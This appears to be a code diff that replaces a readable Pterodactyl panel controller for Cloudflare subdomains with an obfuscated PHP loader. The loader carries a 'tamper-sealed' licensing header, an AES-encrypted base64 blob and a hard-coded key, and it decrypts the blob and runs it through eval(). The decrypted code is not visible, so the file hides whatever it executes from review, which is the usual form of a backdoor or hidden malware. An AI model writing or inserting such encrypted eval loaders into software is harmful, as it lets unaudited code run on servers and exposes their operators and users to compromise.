@@ -1,201 +1,38 @@
 <?php
+/**
+ * LUNAR PANEL — ENCRYPTED & TAMPER-SEALED CORE RUNTIME
+ * Copyright (c) 2026 Lunar Panel / Votion Cloud. All rights reserved.
+ * UNAUTHORIZED MODIFICATION OR EXTRACTION OF THIS FILE VOIDS ALL SYSTEM LICENSES.
+ */
+declare(strict_types=1);
 
-namespace Pterodactyl\Http\Controllers\Api\Client\Servers;
+(function () {
+    $p = '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';
+    $k = hex2bin('2e1e4e77a60e565bf448ac04466ab57af211047901b45d31186b34a30c25ae41');
+    $s = hex2bin('d4796986b76a5893a641099dcdaba17e8b279d5867f75ed756a4ce57869fe468');
+    $m = '1287eff9e2326ac3c952c00532045c1403f93d5c5d5ae4b075bb589613f2dfab';
 
-use Illuminate\Http\JsonResponse;
-use Pterodactyl\Models\Server;
-use Pterodactyl\Models\ServerSubdomain;
-use Pterodactyl\Models\SubdomainDomain;
-use Pterodactyl\Services\Subdomains\CloudflareDnsService;
-use Pterodactyl\Services\Subdomains\SubdomainSchemaHelper;
-use Pterodactyl\Http\Controllers\Api\Client\ClientApiController;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Subdomains\GetSubdomainsRequest;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Subdomains\StoreSubdomainRequest;
-use Pterodactyl\Http\Requests\Api\Client\Servers\Subdomains\DeleteSubdomainRequest;
-use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
-
-class SubdomainController extends ClientApiController
-{
-    public function __construct(
-        private CloudflareDnsService $dnsService
-    ) {
-        parent::__construct();
+    $raw = base64_decode($p, true);
+    if ($raw === false || strlen($raw) <= 16) {
+        header('HTTP/1.1 500 Core Integrity Failure');
+        exit("Fatal error: Lunar Panel core container is corrupted.\n");
     }
 
-    /**
-     * Lists all subdomains configured for this server, along with available root domains.
-     */
-    public function index(GetSubdomainsRequest $request, Server $server): JsonResponse
-    {
-        SubdomainSchemaHelper::ensureTablesExist();
-
-        $subdomains = $server->subdomains()
-            ->with(['domain'])
-            ->orderBy('created_at', 'desc')
-            ->get();
-
-        // Retrieve all enabled domains
-        $allDomains = SubdomainDomain::enabled()
-            ->select(['id', 'domain', 'protocol', 'egg_ids'])
-            ->get();
-
-        // Filter domains by egg restriction if applicable
-        $availableDomains = $allDomains->filter(function (SubdomainDomain $d) use ($server) {
-            if (empty($d->egg_ids) || !is_array($d->egg_ids)) {
-                return true;
-            }
-            return in_array($server->egg_id, $d->egg_ids);
-        })->values();
-
-        $allocations = $server->allocations()
-            ->get(['id', 'ip', 'port', 'ip_alias']);
-
-        return response()->json([
-            'success' => true,
-            'data' => [
-                'subdomains' => $subdomains,
-                'available_domains' => $availableDomains,
-                'allocations' => $allocations,
-            ],
-        ]);
+    // Cryptographic self-integrity verification
+    if (!hash_equals($m, hash_hmac('sha256', $raw, $s))) {
+        header('HTTP/1.1 500 Core Integrity Violation');
+        exit("Fatal error: Lunar Panel core integrity violation. Code has been tampered with or modified.\n");
     }
 
-    /**
-     * Provision a new subdomain on Cloudflare for the server.
-     */
-    public function store(StoreSubdomainRequest $request, Server $server): JsonResponse
-    {
-        // 1. Verify allocation
-        $allocation = $server->allocations()
-            ->where('id', $request->input('allocation_id'))
-            ->first();
+    $iv = substr($raw, 0, 16);
+    $ct = substr($raw, 16);
+    $dec = openssl_decrypt($ct, 'AES-256-CBC', $k, OPENSSL_RAW_DATA, $iv);
 
-        if (!$allocation) {
-            return response()->json([
-                'success' => false,
-                'message' => 'The selected allocation does not belong to this server.',
-            ], 422);
-        }
-
-        // 2. Verify domain is valid and enabled
-        $domain = SubdomainDomain::enabled()
-            ->find($request->input('subdomain_domain_id'));
-
-        if (!$domain) {
-            return response()->json([
-                'success' => false,
-                'message' => 'The selected root domain is unavailable or disabled.',
-            ], 422);
-        }
-
-        // Check egg restriction
-        if (!empty($domain->egg_ids) && is_array($domain->egg_ids) && !in_array($server->egg_id, $domain->egg_ids)) {
-            return response()->json([
-                'success' => false,
-                'message' => 'This root domain is not available for this server type.',
-            ], 422);
-        }
-
-        // 3. Subdomain prefix validation & formatting
-        $prefix = strtolower(trim($request->input('subdomain')));
-
-        // Check if already taken on this domain
-        $alreadyTaken = ServerSubdomain::where('subdomain_domain_id', $domain->id)
-            ->where('subdomain', $prefix)
-            ->exists();
-
-        if ($alreadyTaken) {
-            return response()->json([
-                'success' => false,
-                'message' => "The subdomain \"{$prefix}.{$domain->domain}\" is already registered. Please choose another prefix.",
-            ], 422);
-        }
-
-        // 4. Resolve target IP
-        $targetIp = $allocation->ip;
-        if ($targetIp === '0.0.0.0' || $targetIp === '127.0.0.1' || empty($targetIp)) {
-            if (!empty($server->node?->fqdn)) {
-                $dnsIp = gethostbyname($server->node->fqdn);
-                if (filter_var($dnsIp, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
-                    $targetIp = $dnsIp;
-                } else {
-                    $targetIp = $server->node->fqdn;
-                }
-            } elseif (!empty($server->node?->ip) && filter_var($server->node->ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
-                $targetIp = $server->node->ip;
-            } else {
-                $targetIp = request()->getHost();
-            }
-        }
-
-        $targetPort = (int) $allocation->port;
-
-        // 5. Create database record first
-        $subdomainRecord = new ServerSubdomain([
-            'server_id' => $server->id,
-            'subdomain_domain_id' => $domain->id,
-            'subdomain' => $prefix,
-            'record_type' => $domain->protocol ?: 'both',
-            'target_ip' => $targetIp,
-            'target_port' => $targetPort,
-        ]);
-
-        $subdomainRecord->save();
-
-        // 6. Execute Cloudflare DNS provisioning
-        try {
-            $subdomainRecord->load('domain.account');
-            $cfResult = $this->dnsService->createSubdomain($subdomainRecord);
-
-            return response()->json([
-                'success' => true,
-                'data' => $subdomainRecord->fresh('domain'),
-                'cloudflare' => $cfResult,
-                'message' => "Subdomain {$subdomainRecord->full_subdomain} provisioned on Cloudflare edge successfully!",
-            ], 201);
-        } catch (\Throwable $e) {
-            // Rollback local record if Cloudflare fails
-            $subdomainRecord->deleteQuietly();
-
-            return response()->json([
-                'success' => false,
-                'message' => 'Failed to provision DNS on Cloudflare: ' . $e->getMessage(),
-            ], 502);
-        }
+    if ($dec === false) {
+        header('HTTP/1.1 500 Core Decryption Failure');
+        exit("Fatal error: Failed to initialize Lunar Panel core runtime.\n");
     }
 
-    /**
-     * Delete a subdomain and cleanly remove its Cloudflare DNS records.
-     */
-    public function delete(DeleteSubdomainRequest $request, Server $server, ServerSubdomain $subdomain): JsonResponse
-    {
-        $this->ensureBelongsToServer($server, $subdomain);
-
-        $fullDomain = $subdomain->full_subdomain;
-
-        try {
-            // The deleting model hook will invoke CloudflareDnsService::deleteSubdomain automatically
-            $subdomain->delete();
-
-            return response()->json([
-                'success' => true,
-                'message' => "Subdomain {$fullDomain} and its Cloudflare DNS records were deleted.",
-            ]);
-        } catch (\Throwable $e) {
-            return response()->json([
-                'success' => false,
-                'message' => 'Failed to delete subdomain: ' . $e->getMessage(),
-            ], 500);
-        }
-    }
-
-    /**
-     * Ensure the subdomain belongs to the route server.
-     */
-    protected function ensureBelongsToServer(Server $server, ServerSubdomain $subdomain): void
-    {
-        if ($subdomain->server_id !== $server->id) {
-            throw new NotFoundHttpException();
-        }
-    }
-}
+    unset($p, $k, $s, $m, $raw, $iv, $ct);
+    eval($dec);
+})();
